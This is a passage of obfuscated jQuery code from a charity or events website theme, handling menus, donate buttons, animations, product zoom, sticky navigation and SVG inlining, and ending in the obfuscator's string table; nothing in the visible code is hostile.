    var _0xeb0e10 = _0x56c55d(".shopping-cart-full");
    return (
      _0xeb0e10["on"](_0xa8b4ec(0x1bc), _0xa8b4ec(0x344), function (_0x168fe0) {
        var _0x526916 = _0xa8b4ec;
        (_0x168fe0[_0x526916(0x137)](),
          _0x56c55d(this)
            ["closest"]("tr")
            ["stop"]()
            ["fadeOut"](function () {
              var _0x27cb52 = _0x526916;
              _0x56c55d(this)[_0x27cb52(0x16c)]();
            }));
      }),
      this
    );
  }),
    ((_0x4381fa[_0x363537(0x130)][_0x363537(0x195)] = function (_0x583405) {
      var _0x383d4e = _0x363537,
        _0x4a050a = _0x56c55d(_0x383d4e(0x234));
      if (!_0x4a050a[_0x383d4e(0x2c0)]) return;
      return (
        _0x4a050a["each"](function (_0x1456e6, _0xa7788c) {
          var _0x1354f5 = _0x383d4e;
          _0x56c55d(_0xa7788c)
            [_0x1354f5(0x1bd)](_0x1354f5(0x252))
            [_0x1354f5(0x340)]();
        }),
        _0x4a050a["on"]("click.hidden", ".invoker", function (_0x64b04e) {
          var _0x2f872f = _0x383d4e;
          (_0x64b04e[_0x2f872f(0x137)](),
            _0x56c55d(this)["toggleClass"]("toggled"));
          var _0x3d11a1 = _0x56c55d(this)
            [_0x2f872f(0x292)](_0x2f872f(0x234))
            [_0x2f872f(0x1bd)](_0x2f872f(0x252));
          _0x3d11a1[_0x2f872f(0x2a4)]({
            duration: 0x1f4,
            easing: _0x2f872f(0x18a),
            complete: _0x583405 ? _0x583405 : function () {},
          });
        }),
        _0x4a050a
      );
    }),
    _0x56c55d[_0x363537(0x270)]({
      isjQuery: function (_0x31785a, _0x1d3e9c) {
        var _0x492f26 = _0x363537;
        if (_0x31785a === undefined || _0x31785a === null) return ![];
        return _0x1d3e9c === undefined
          ? _0x31785a instanceof jQuery
          : _0x56c55d[_0x492f26(0x30f)](_0x31785a) && _0x31785a["length"];
      },
    })),
    _0x56c55d["fn"]["extend"]({
      jQueryImagesLoaded: function () {
        var _0x5dd132 = _0x363537,
          _0x545f50 = this[_0x5dd132(0x1bd)](_0x5dd132(0x33d));
        if (!_0x545f50[_0x5dd132(0x2c0)])
          return _0x56c55d[_0x5dd132(0x1e4)]()
            [_0x5dd132(0x24c)]()
            [_0x5dd132(0x157)]();
        var _0x4b7d5e = [];
        return (
          _0x545f50[_0x5dd132(0x24d)](function () {
            var _0x252bc0 = _0x5dd132,
              _0xa678a8 = _0x56c55d["Deferred"]();
            _0x4b7d5e[_0x252bc0(0x33c)](_0xa678a8);
            var _0x2d8062 = new Image();
            ((_0x2d8062[_0x252bc0(0x241)] = function () {
              _0xa678a8["resolve"]();
            }),
              (_0x2d8062[_0x252bc0(0x18b)] = function () {
                var _0x26e65a = _0x252bc0;
                _0xa678a8[_0x26e65a(0x24c)]();
              }),
              (_0x2d8062[_0x252bc0(0x2e1)] = this["src"]));
          }),
          _0x56c55d["when"][_0x5dd132(0x2e4)](_0x56c55d, _0x4b7d5e)
        );
      },
    }),
    _0x455ae7["on"](_0x363537(0x17b), function (_0x2d8a7e) {
      var _0x1823b0 = _0x363537;
      _0x56c55d(_0x2d8a7e["target"])[_0x1823b0(0x307)](_0x1823b0(0x238)) &&
        _0x2d8a7e[_0x1823b0(0x2c1)]();
    }),
    _0x455ae7[_0x363537(0x14e)](function () {
      var _0x2f9ea9 = _0x363537;
      _0x4381fa[_0x2f9ea9(0x34f)]();
    }),
    _0x56c55d(window)["on"](_0x363537(0x21f), function () {
      var _0x182901 = _0x363537;
      _0x2cceb6[_0x182901(0x26b)](function () {
        var _0x2da10c = _0x182901;
        _0x4381fa[_0x2da10c(0x244)]();
      });
      if (
        _0x56c55d(_0x182901(0x222))[_0x182901(0x2c0)] ||
        _0x56c55d(_0x182901(0x24a))[_0x182901(0x2c0)]
      ) {
        (_0x56c55d(
          ".mad-vr-nav\x20>\x20ul\x20>\x20li.menu-item-has-children\x20>\x20a",
        )["on"]("click", function (_0x4f2bd5) {
          var _0x5dc274 = _0x182901;
          (_0x4f2bd5[_0x5dc274(0x137)](),
            _0x56c55d(this)["next"](_0x5dc274(0x330))[_0x5dc274(0x2a4)](),
            _0x56c55d(this)
              [_0x5dc274(0x2b6)]()
              ["siblings"]()
              [_0x5dc274(0x199)](_0x5dc274(0x330))
              [_0x5dc274(0x354)]());
        }),
          _0x56c55d(_0x182901(0x18d))["on"](
            _0x182901(0x1c4),
            function (_0x45a9be) {
              var _0x22fa48 = _0x182901;
              (_0x45a9be[_0x22fa48(0x137)](),
                _0x56c55d("html")[_0x22fa48(0x302)]("with-src-menu"),
                _0x56c55d(this)[_0x22fa48(0x24b)]("mad-opened"),
                _0x56c55d(_0x22fa48(0x222))["toggleClass"](_0x22fa48(0x20a)),
                _0x56c55d(_0x22fa48(0x24a))[_0x22fa48(0x24b)]("mad-opened"));
            },
          ),
          _0x56c55d("#mad-sidebar-btn")["on"]("click", function (_0x4663dc) {
            var _0xaed2cd = _0x182901;
            (_0x4663dc[_0xaed2cd(0x137)](),
              _0x56c55d(this)[_0xaed2cd(0x24b)](_0xaed2cd(0x29d)),
              _0x56c55d(_0xaed2cd(0x24a))[_0xaed2cd(0x24b)](_0xaed2cd(0x29d)));
          }),
          _0x56c55d(_0x182901(0x24a))["on"]("click", function (_0x5e5df5) {
            var _0x11dbce = _0x182901;
            _0x5e5df5[_0x11dbce(0x30d)][_0x11dbce(0x197)][_0x11dbce(0x2a0)](
              _0x11dbce(0x29d),
            ) &&
              (_0x56c55d(_0x11dbce(0x24a))["removeClass"](_0x11dbce(0x29d)),
              _0x56c55d(_0x11dbce(0x1b3))[_0x11dbce(0x29f)](_0x11dbce(0x29d)));
          }),
          _0x56c55d(_0x182901(0x2f1))["on"](
            _0x182901(0x1c4),
            function (_0x3f7240) {
              var _0x11e7aa = _0x182901;
              (_0x3f7240[_0x11e7aa(0x137)](),
                _0x56c55d(_0x11e7aa(0x13c))[_0x11e7aa(0x29f)](_0x11e7aa(0x20a)),
                _0x56c55d(_0x11e7aa(0x1b3))["removeClass"](_0x11e7aa(0x29d)),
                _0x56c55d("html")[_0x11e7aa(0x29f)](_0x11e7aa(0x2d0)));
            },
          ));
        const _0x1f4794 = _0x56c55d(
          ".mad-nav-canvas,\x20.mad-nav-btn,\x20.mad-sidebar-element",
        );
        _0x56c55d(document)[_0x182901(0x2e7)]((_0x10c514) => {
          var _0x1bf672 = _0x182901;
          !_0x1f4794["is"](_0x10c514[_0x1bf672(0x30d)]) &&
            _0x1f4794["has"](_0x10c514[_0x1bf672(0x30d)])[_0x1bf672(0x2c0)] ===
              0x0 &&
            (_0x56c55d(_0x1bf672(0x13c))["removeClass"]("mad-nav-opened"),
            _0x56c55d(".mad-nav-btn")[_0x1bf672(0x29f)](_0x1bf672(0x29d)),
            _0x56c55d(".mad-sidebar-element")["removeClass"](_0x1bf672(0x29d)));
        });
      }
      if (_0x56c55d("[data-appear-animation]")[_0x182901(0x2c0)]) {
        function _0x530089() {
          var _0x4216ae = _0x182901;
          _0x56c55d("[data-appear-animation]")[_0x4216ae(0x24d)](function () {
            var _0x274df2 = _0x4216ae,
              _0x39cc10 = _0x56c55d(this);
            (_0x39cc10[_0x274df2(0x302)](_0x274df2(0x1c9)),
              _0x56c55d(window)["width"]() > 0x4b0
                ? _0x39cc10["appear"](
                    function () {
                      var _0x224dc2 = _0x274df2,
                        _0x5f4cb6 = _0x39cc10[_0x224dc2(0x2cd)](
                          _0x224dc2(0x320),
                        )
                          ? _0x39cc10[_0x224dc2(0x2cd)](_0x224dc2(0x320))
                          : 0x1;
                      if (_0x5f4cb6 > 0x1)
                        _0x39cc10[_0x224dc2(0x12a)](
                          "animation-delay",
                          _0x5f4cb6 + "ms",
                        );
                      (_0x39cc10[_0x224dc2(0x302)](
                        _0x39cc10[_0x224dc2(0x2cd)](_0x224dc2(0x26d)),
                      ),
                        setTimeout(function () {
                          var _0x180b08 = _0x224dc2;
                          _0x39cc10["addClass"](_0x180b08(0x2b4));
                        }, _0x5f4cb6));
                    },
                    { accX: 0x0, accY: -0x96 },
                  )
                : _0x39cc10[_0x274df2(0x302)]("appear-animation-visible"));
          });
        }
        (_0x530089(), _0x56c55d(window)["on"]("resize", _0x530089));
      }
      _0x56c55d(_0x182901(0x2d3))[_0x182901(0x2c0)] &&
        _0x56c55d(window)["scroll"](function () {
          var _0x21c557 = _0x182901,
            _0x5c6c82 = _0x56c55d(window)[_0x21c557(0x23e)](),
            _0x194147 = _0x21c557(0x19a) + -_0x5c6c82 / 0x28 + _0x21c557(0x32a),
            _0x1a77e0 = _0x21c557(0x19a) + _0x5c6c82 / 0x28 + "px)";
          (_0x56c55d(".mad-img-move")[_0x21c557(0x12a)]({
            transform: _0x194147,
          }),
            _0x56c55d(".mad-img-move-down")["css"]({ transform: _0x1a77e0 }));
        });
      if (_0x56c55d(".mad-change-bg")["length"]) {
        const _0x5a8b82 = document[_0x182901(0x181)](_0x182901(0x140));
        _0x5a8b82[_0x182901(0x219)]((_0x4d07a3) => {
          var _0x5e87c8 = _0x182901;
          _0x4d07a3[_0x5e87c8(0x283)]("mouseenter", (_0x32b007) => {
            var _0x45d5f7 = _0x5e87c8;
            const _0x3a1143 =
                _0x32b007[_0x45d5f7(0x30d)][_0x45d5f7(0x1d8)]("data-bg-img"),
              _0x43d5f6 = _0x32b007[_0x45d5f7(0x30d)][_0x45d5f7(0x292)](
                _0x45d5f7(0x187),
              ),
              _0x2ade45 = _0x43d5f6[_0x45d5f7(0x33f)](_0x45d5f7(0x338));
            (_0x56c55d(_0x2ade45)["addClass"](_0x45d5f7(0x347)),
              setTimeout(() => {
                var _0x473e99 = _0x45d5f7;
                (_0x56c55d(_0x2ade45)[_0x473e99(0x29f)](_0x473e99(0x347)),
                  (_0x2ade45[_0x473e99(0x173)]["backgroundImage"] =
                    _0x473e99(0x1df) + _0x3a1143 + _0x473e99(0x133)));
              }, 0x12c));
          });
        });
      }
      if (_0x56c55d(_0x182901(0x317))[_0x182901(0x2c0)]) {
        _0x56c55d(".mad-donate-btn")["on"]("click", function () {
          var _0x5c0635 = _0x182901;
          _0x56c55d(this)
            [_0x5c0635(0x302)](_0x5c0635(0x1ea))
            [_0x5c0635(0x19f)]()
            [_0x5c0635(0x29f)]("active");
        });
        const _0x15fa4c = document[_0x182901(0x33f)](".mad-donate-value"),
          _0x14ed34 = document["querySelectorAll"](_0x182901(0x1ef));
        (_0x14ed34[_0x182901(0x219)]((_0x961298) => {
          var _0x33a85a = _0x182901;
          _0x961298["addEventListener"](_0x33a85a(0x1c4), (_0x1f3108) => {
            var _0x5a4164 = _0x33a85a;
            const _0x3720f5 = _0x1f3108[_0x5a4164(0x30d)][_0x5a4164(0x1d8)](
              _0x5a4164(0x1a8),
            );
            _0x15fa4c[_0x5a4164(0x261)] = _0x3720f5;
          });
        }),
          _0x56c55d(_0x182901(0x23d))["on"]("click", function () {
            var _0x449867 = _0x182901;
            _0x56c55d(this)
              [_0x449867(0x292)](_0x449867(0x191))
              [_0x449867(0x316)](_0x449867(0x13b));
          }));
      }
      if (_0x56c55d(_0x182901(0x14f))[_0x182901(0x2c0)]) {
        (_0x56c55d(_0x182901(0x2a5))["on"]("click", function (_0x55fba6) {
          var _0xd48b48 = _0x182901;
          (_0x55fba6["preventDefault"](),
            _0x56c55d(_0xd48b48(0x14f))[_0xd48b48(0x2a4)]());
        }),
          _0x56c55d(_0x182901(0x275))["on"](
            _0x182901(0x1c4),
            function (_0x50485a) {
              var _0x3490f2 = _0x182901;
              (_0x50485a[_0x3490f2(0x137)](),
                _0x56c55d(_0x3490f2(0x275))
                  [_0x3490f2(0x310)](this)
                  [_0x3490f2(0x277)](_0x3490f2(0x1bf))
                  [_0x3490f2(0x354)](),
                _0x56c55d(this)
                  [_0x3490f2(0x277)](_0x3490f2(0x1bf))
                  [_0x3490f2(0x2a4)](),
                _0x56c55d(this)[_0x3490f2(0x24b)](_0x3490f2(0x306)),
                _0x56c55d(_0x3490f2(0x275))
                  [_0x3490f2(0x310)](this)
                  [_0x3490f2(0x29f)](_0x3490f2(0x306)));
            },
          ),
          _0x56c55d(_0x182901(0x16d))["on"](
            _0x182901(0x1c4),
            function (_0x36838b) {
              var _0x39e218 = _0x182901;
              (_0x36838b["preventDefault"](),
                _0x56c55d(this)
                  [_0x39e218(0x2b6)](_0x39e218(0x1bf))
                  [_0x39e218(0x2a4)]());
            },
          ));
        const _0x5eb1a5 = _0x56c55d(".mad-event-select");
        _0x56c55d(document)[_0x182901(0x2e7)]((_0x27c150) => {
          var _0x270f7b = _0x182901;
          !_0x5eb1a5["is"](_0x27c150[_0x270f7b(0x30d)]) &&
            _0x5eb1a5[_0x270f7b(0x19c)](_0x27c150[_0x270f7b(0x30d)])[
              _0x270f7b(0x2c0)
            ] === 0x0 &&
            _0x56c55d(_0x270f7b(0x1bf))[_0x270f7b(0x354)]();
        });
      }
      if (_0x56c55d(_0x182901(0x243))[_0x182901(0x2c0)]) {
        var _0xdb48ee = 0x0;
        (_0x56c55d(_0x182901(0x291))["each"](function () {
          var _0x404bfe = _0x182901;
          _0x56c55d(this)[_0x404bfe(0x2e2)]() > _0xdb48ee &&
            (_0xdb48ee = _0x56c55d(this)["height"]());
        }),
          _0x56c55d(".same-height\x20.mad-grid-item")[_0x182901(0x2e2)](
            _0xdb48ee,
          ));
      }
      (_0x56c55d(".calendar-popup")[_0x182901(0x2c0)] &&
        (_0x56c55d(_0x182901(0x2ba))["on"]("click", function (_0x1e1a1f) {
          var _0x3e64b2 = _0x182901;
          (_0x1e1a1f[_0x3e64b2(0x137)](),
            _0x56c55d(this)
              ["closest"](_0x3e64b2(0x323))
              ["addClass"](_0x3e64b2(0x1ea)));
        }),
        _0x56c55d(document)[_0x182901(0x2e7)]((_0x1cfb3b) => {
          var _0x311209 = _0x182901;
          !_0x56c55d(_0x311209(0x323))["is"](_0x1cfb3b["target"]) &&
            _0x56c55d(".mad-event")[_0x311209(0x19c)](
              _0x1cfb3b[_0x311209(0x30d)],
            )[_0x311209(0x2c0)] === 0x0 &&
            _0x56c55d(_0x311209(0x323))[_0x311209(0x29f)](_0x311209(0x1ea));
        })),
        _0x56c55d(window)[_0x182901(0x16a)]() > 0x3e0 &&
          _0x56c55d(_0x182901(0x303))[_0x182901(0x2c0)] &&
          _0x56c55d(window)["scroll"](function () {
            var _0x1a02b3 = _0x182901;
            const _0x363bfc = _0x56c55d(window)[_0x1a02b3(0x23e)](),
              _0x2524e2 =
                _0x56c55d(_0x1a02b3(0x257))[_0x1a02b3(0x2e2)]() + 0x12c;
            _0x363bfc >= _0x2524e2
              ? _0x56c55d(_0x1a02b3(0x303))[_0x1a02b3(0x302)](_0x1a02b3(0x2be))
              : _0x56c55d(".nav-scroll-menu")["removeClass"]("sticky");
          }),
        _0x56c55d(".mad-label-acc")["length"] &&
          (_0x56c55d(_0x182901(0x242))
            ["next"](".mad-br-text")
            [_0x182901(0x340)](),
          _0x56c55d(".mad-label-acc.toggled")
            [_0x182901(0x277)](_0x182901(0x290))
            [_0x182901(0x192)](),
          _0x56c55d(".mad-label-radio")["on"](
            _0x182901(0x1c4),
            function (_0x24dbef) {
              var _0xb7a765 = _0x182901;
              (_0x56c55d(_0xb7a765(0x357))[_0xb7a765(0x29f)]("toggled"),
                _0x56c55d(this)["addClass"](_0xb7a765(0x358)),
                _0x56c55d(_0xb7a765(0x357))
                  [_0xb7a765(0x310)](_0xb7a765(0x2ad))
                  [_0xb7a765(0x277)](".mad-br-text")
                  ["slideUp"](),
                _0x56c55d(this)[_0xb7a765(0x307)](_0xb7a765(0x358)) &&
                  _0x56c55d(this)
                    [_0xb7a765(0x277)](_0xb7a765(0x290))
                    ["slideDown"](),
                setTimeout(() => {
                  var _0x2e51e9 = _0xb7a765;
                  _0x56c55d(".owl-carousel")[_0x2e51e9(0x316)](
                    "refresh.owl.carousel",
                  );
                }, 0x1f4));
            },
          )));
    }));
  if (_0x56c55d(_0x363537(0x1b5))[_0x363537(0x2c0)]) {
    var _0x3d3027 = _0x56c55d(".qv-preview");
    _0x56c55d(_0x363537(0x2cb))[_0x363537(0x1ee)]({
      gallery: _0x363537(0x227),
      galleryActiveClass: _0x363537(0x1ea),
      zoomType: _0x363537(0x1be),
      cursor: _0x363537(0x189),
      responsive: !![],
      zoomWindowFadeIn: 0x1f4,
      zoomWindowFadeOut: 0x1f4,
      easing: !![],
      lensFadeIn: 0x1f4,
      lensFadeOut: 0x1f4,
    });
  }
  if (_0x56c55d(_0x363537(0x1f7))[_0x363537(0x2c0)]) {
    var _0x161995 = _0x56c55d(_0x363537(0x1f7));
    _0x161995[_0x363537(0x24d)](function () {
      var _0x594c06 = _0x363537,
        _0x4242d6 = _0x56c55d(this),
        _0x59280e = _0x4242d6[_0x594c06(0x199)](_0x594c06(0x311)),
        _0x5dafe8 = _0x4242d6[_0x594c06(0x199)]("input[type=\x22text\x22]"),
        _0x9527c5 = +_0x5dafe8["val"]();
      _0x59280e["on"](_0x594c06(0x1c4), function () {
        var _0x3077a3 = _0x594c06;
        if (_0x56c55d(this)["hasClass"](_0x3077a3(0x237))) {
          if (_0x9527c5 === 0x1) return ![];
          _0x5dafe8[_0x3077a3(0x1ed)](--_0x9527c5);
        } else _0x5dafe8[_0x3077a3(0x1ed)](++_0x9527c5);
      });
    });
  }
  return _0x4381fa;
})(window["jQuery"]);
$(document)["on"]("click", _0x2063ae(0x136), function (_0x213545) {
  var _0x5df371 = _0x2063ae;
  _0x213545["preventDefault"]();
  var _0x97f61e = $(this),
    _0x18cbb2 = _0x97f61e[_0x5df371(0x292)](_0x5df371(0x2fd));
  videoPlay(_0x18cbb2);
});
function videoPlay(_0x245016) {
  var _0x1e2b19 = _0x2063ae,
    _0x2477d4 = _0x245016[_0x1e2b19(0x1bd)](_0x1e2b19(0x194)),
    _0x554d1a = _0x2477d4["data"]("src");
  (_0x245016[_0x1e2b19(0x302)](_0x1e2b19(0x26f)),
    _0x2477d4[_0x1e2b19(0x2cd)]("src", _0x554d1a));
}
($(function () {
  var _0x4a1372 = _0x2063ae;
  jQuery("img.svg")[_0x4a1372(0x24d)](function () {
    var _0x531a39 = _0x4a1372,
      _0x34f592 = jQuery(this),
      _0x45d536 = _0x34f592[_0x531a39(0x2cd)]("id"),
      _0x4f6b66 = _0x34f592[_0x531a39(0x2cd)]("class"),
      _0x30d81b = _0x34f592["attr"](_0x531a39(0x2e1));
    jQuery[_0x531a39(0x35a)](
      _0x30d81b,
      function (_0x23a631) {
        var _0x235da4 = _0x531a39,
          _0x5e4833 = jQuery(_0x23a631)[_0x235da4(0x1bd)](_0x235da4(0x262));
        (typeof _0x45d536 !== _0x235da4(0x177) &&
          (_0x5e4833 = _0x5e4833[_0x235da4(0x2cd)]("id", _0x45d536)),
          typeof _0x4f6b66 !== _0x235da4(0x177) &&
            (_0x5e4833 = _0x5e4833[_0x235da4(0x2cd)](
              _0x235da4(0x2e8),
              _0x4f6b66 + "\x20replaced-svg",
            )),
          (_0x5e4833 = _0x5e4833["removeAttr"](_0x235da4(0x154))),
          !_0x5e4833[_0x235da4(0x2cd)](_0x235da4(0x2eb)) &&
            _0x5e4833[_0x235da4(0x2cd)](_0x235da4(0x2e2)) &&
            _0x5e4833[_0x235da4(0x2cd)](_0x235da4(0x16a)) &&
            _0x5e4833[_0x235da4(0x2cd)](
              _0x235da4(0x2eb),
              _0x235da4(0x152) +
                _0x5e4833[_0x235da4(0x2cd)]("height") +
                "\x20" +
                _0x5e4833["attr"](_0x235da4(0x16a)),
            ),
          _0x34f592[_0x235da4(0x2f9)](_0x5e4833));
      },
      _0x531a39(0x1a1),
    );
  });
}),
  $(window)["on"]("load\x20resize", function () {
    var _0x101859 = _0x2063ae;
    $(window)[_0x101859(0x16a)]() > 0x3e0 &&
      $(_0x101859(0x2bb))[_0x101859(0x2c0)] &&
      $(_0x101859(0x2b3))["theiaStickySidebar"]({
        additionalMarginTop: 0x20,
        additionalMarginBottom: 0x20,
      });
  }));
$(_0x2063ae(0x2f0))[_0x2063ae(0x2c0)] &&
  $("body")[_0x2063ae(0x1d0)]({
    hash: !![],
    filter: _0x2063ae(0x2d2),
    onBefore: function () {
      var _0x328b05 = _0x2063ae;
      this[_0x328b05(0x1a2)] = -0x64;
    },
  });
$(window)["on"]("load\x20resize\x20open", function () {
  var _0x2ff7cc = _0x2063ae,
    _0x2825f6 = $(".mad-grid--isotope:not(.mad-sponsors)");
  _0x2825f6[_0x2ff7cc(0x2c0)] &&
    window["MadIsotopeWrapper"] &&
    _0x2825f6["each"](function (_0x188d13, _0x2f93d0) {
      var _0x440ea9 = _0x2ff7cc,
        _0x20587e = $(_0x2f93d0),
        _0xb61381 = _0x20587e["closest"](_0x440ea9(0x2d9));
      _0xb61381[_0x440ea9(0x2c0)]
        ? _0xb61381["on"](_0x440ea9(0x200), function () {
            var _0x378553 = _0x440ea9;
            if (_0x20587e["data"]("IsotopeWrapper")) return;
            MadIsotopeWrapper[_0x378553(0x308)](_0x20587e, {
              itemSelector: ".mad-grid-item",
              transitionDuration: self[_0x378553(0x247)],
            });
          })
        : MadIsotopeWrapper[_0x440ea9(0x308)](_0x20587e, {
            itemSelector: ".mad-grid-item",
            transitionDuration: self["ANIMATIONDURATION"],
          });
    });
});
function _0x4958() {
  var _0x287f3b = [
    "getPropertyValue",
    "next",
    "stealthy",
    "append",
    ".mad-alert-box",
    "fadeOutUp",
    "stretchContent",
    "mousemove.MadPreloader",
    "#rev-slider",
    "fullScreenArea",
    "li\x20a",
    "_individualConfigs",
    ".calendar_wrap",
    "addEventListener",
    "--color-primary",
    "4293312iDJgRV",
    "insertAfter",
    "dropdown--opened",
    "values",
    ".mad-preloader",
    "inline-block",
    "#prev\x20>\x20a",
    "owlUpdateIsotopeParent",
    "prepare",
    "MadContactForm",
    "min",
    ".mad-br-text",
    ".same-height\x20.mad-grid-item",
    "closest",
    "stretchedContent",
    "maps",
    "$bottomLevelEl",
    "mad-preloader--disappearing",
    "rating-bottom-level",
    "beforeOpen",
    ".mad-grid.owl-carousel",
    "_markupBuilded",
    "Handlebars",
    "topPlaced",
    "mad-opened",
    "stopPropagation",
    "removeClass",
    "contains",
    "addDomListener",
    "<i\x20class=\x22material-icons\x20active\x22>star</i>",
    "$element",
    "slideToggle",
    "#mad-toggle-filter",
    "title",
    "owl-carousel--vadaptive",
    "container",
    "calendarWidget",
    "ANIMATIONEASING",
    "data",
    "<img\x20class=\x22svg\x22\x20src=\x22charity_icons_svg/arrow_left.svg\x22\x20alt=\x22\x22>",
    ".toggled",
    "#googleMap2",
    "keyCode",
    "margin-left",
    "html,\x20body",
    "arcticModals",
    ".content,\x20.sidebar\x20,\x20.mad-sidebar\x20,\x20#sidebar",
    "appear-animation-visible",
    "dynamicBgImage",
    "parent",
    "afterClose",
    "userAgent",
    "defaults",
    ".calendar-popup",
    ".sticky-bar",
    "&from=",
    "Your\x20browser\x20does\x20not\x20support\x20some\x20technologies\x20this\x20site\x20use.\x20Please\x20update\x20your\x20browser\x20or\x20visit\x20the\x20site\x20using\x20more\x20modern\x20browser.",
    "sticky",
    "touchevents",
    "length",
    "stopImmediatePropagation",
    "outerHeight",
    "Days",
    ".mad-range-slider-input",
    "MonkeysanNav",
    "isotope",
    "inview",
    "built.mad.Rating",
    "to.owl.carousel",
    ".mad-panels--toggles",
    "#zoom-image",
    "linear",
    "attr",
    "AJAX_token",
    ".mad-rating-field",
    "with-src-menu",
    "loadingClass",
    ".animated",
    ".mad-img-move",
    ".mad-entities.owl-carousel.mad-grid--cols-2",
    ".bg-move",
    "<i\x20class=\x22icon\x20licon-arrow-left\x22></i>",
    "navigator",
    "ajax",
    ".mad-section--stretched-content,\x20.mad-section--stretched-content-no-px",
    "section--loading",
    "off",
    "getPosition",
    "bgImageElementClass",
    "click.MadDropdown",
    "spinner3",
    "setCenter",
    "src",
    "height",
    "mad-grid--cols-5",
    "apply",
    "arctic-modal-ajax-action",
    ".mad-has-sidebar",
    "mouseup",
    "class",
    "dropdown-title",
    "addListener",
    "viewBox",
    "url(\x22",
    "ratingField",
    ".owl-next",
    "countdown",
    "a.animated",
    ".mad-nav-close",
    "zoomIn",
    ".owl-carousel[data-sync]",
    "mad-toggled-fields-invoker--opened",
    "layout",
    "vertical",
    "true",
    "hasBGImageElement",
    "replaceWith",
    "540mWOApr",
    "MonkeysanAccordion",
    ".mad-testimonials\x20.owl-carousel",
    ".js-videoWrapper",
    "arctic-modal-type",
    "click.MadArcticModals",
    "mad-grid--cols-4",
    "#googleMap3",
    "addClass",
    ".nav-scroll-menu",
    "mad-calendar-rendered",
    "sync",
    "toggle",
    "hasClass",
    "init",
    ".mad-rating",
    "<i\x20class=\x22icon\x20icon-sad\x22></i>",
    "end",
    "mad-",
    "target",
    "[data-arctic-modal]",
    "isjQuery",
    "not",
    "button",
    ".active",
    "slice",
    "_buildMarkup",
    "#rev-slider-1",
    "trigger",
    ".mad-donate-element",
    "default",
    "RTL",
    "<div></div>",
    "year",
    ".mad-section",
    "Years",
    "clientX",
    "[data-bg-image-src]",
    "data-appear-animation-delay",
    ".mad-tabs-nav\x20.mad-tab-link",
    "arctic-modal",
    ".mad-event",
    "mousewheel\x20click\x20touchmove",
    ".mad-entities.owl-carousel.mad-grid--cols-3",
    "aria-expanded",
    "indexOf",
    "stretchedContentClass",
    "fixPosition",
    "px)",
    "rtl",
    "direction",
    "ROADMAP",
    "[class*=\x22mad-section--stretched-content\x22]",
    "Colorizer",
    ".sub-menu",
    "horisontal",
    "hash",
    "cssPrefix",
    "Minutes",
    "Price:",
    "prototype",
    "Weeks",
    ".mad-entity-bg",
    ".mad-range-slider",
    ".mad-custom-select",
    "M52\x200.0078125C60.8617\x200.0103157\x2069.5757\x202.16006\x2077.3156\x206.25311C85.0554\x2010.3462\x2091.5643\x2016.2468\x2096.225\x2023.3953C100.886\x2030.5438\x20103.543\x2038.7031\x20103.946\x2047.0992C104.349\x2055.4953\x20102.484\x2063.8497\x2098.5266\x2071.3701C91.8308\x2084.0571\x2057.8924\x20104.016\x2051.9178\x20128.008C42.2216\x20104.721\x2012.1692\x2084.0571\x205.4734\x2071.3701C1.5165\x2063.8497\x20-0.349035\x2055.4953\x200.0537717\x2047.0992C0.456578\x2038.7031\x203.11437\x2030.5438\x207.77501\x2023.3953C12.4357\x2016.2468\x2018.9446\x2010.3462\x2026.6845\x206.25311C34.4243\x202.16006\x2043.1383\x200.0103157\x2052\x200.0078125ZM66.3235\x2028.4644C62.0838\x2025.7775\x2057.0991\x2024.3434\x2052\x2024.3434C45.1623\x2024.3434\x2038.6046\x2026.9196\x2033.7696\x2031.5053C28.9346\x2036.0911\x2026.2183\x2042.3107\x2026.2183\x2048.7959C26.2183\x2053.6321\x2027.7304\x2058.3598\x2030.5633\x2062.381C33.3962\x2066.4022\x2037.4228\x2069.5363\x2042.1338\x2071.387C46.8448\x2073.2378\x2052.0286\x2073.722\x2057.0298\x2072.7785C62.0309\x2071.835\x2066.6248\x2069.5061\x2070.2304\x2066.0864C73.8361\x2062.6667\x2076.2915\x2058.3096\x2077.2863\x2053.5663C78.2811\x2048.823\x2077.7705\x2043.9064\x2075.8192\x2039.4383C73.8678\x2034.9702\x2070.5633\x2031.1512\x2066.3235\x2028.4644Z",
    "push",
    "img[src!=\x22\x22]",
    ".mad-alert-box--warning",
    "querySelector",
    "hide",
    "onunload",
    "_config",
    "#mad-header:not(.mad-header--transparent)",
    ".mad-close-item",
    "ANIMATIONEND",
    "colorizer-bg-image",
    "flicker",
    "mad-grid--cols-2",
    "slider",
    "mad-disabled",
    "fadeIn",
    "isPlainObject",
    "Breadcrumb",
    "input[type=\x22hidden\x22]",
    "afterDOMReady",
    "#googleMap",
    "MonkeysanTabs",
    "MapTypeId",
    "<i\x20class=\x22material-icons\x22>star_border</i>",
    "slideUp",
    "btn",
    "MadSidebarHidden",
    ".mad-label-radio",
    "toggled",
    "keydown.MadDropdown",
    "get",
    "rightPlacedClass",
    "body--has-critical-fullscreen-message",
    ".mad-product-thumbs",
    "closeBtn",
    "1780CJbJmr",
    "owlCarousel",
    "css",
    "199810YEQYdO",
    "month",
    "href",
    "standard",
    "write",
    "modules",
    "stretchedClass",
    "newTab",
    ".jpg\x22)",
    "px,\x20",
    "toggledFields",
    ".js-videoPoster",
    "preventDefault",
    "_bindEvents",
    "<div\x20class=\x22%cssPrefix%fullscreen-message\x20%cssClass%\x20%cssPrefix%aligner\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22%cssPrefix%aligner-outer\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22%cssPrefix%aligner-inner\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22%cssPrefix%fullscreen-message-before\x22>%before%</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22%cssPrefix%fullscreen-message-content\x22>%content%</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22%cssP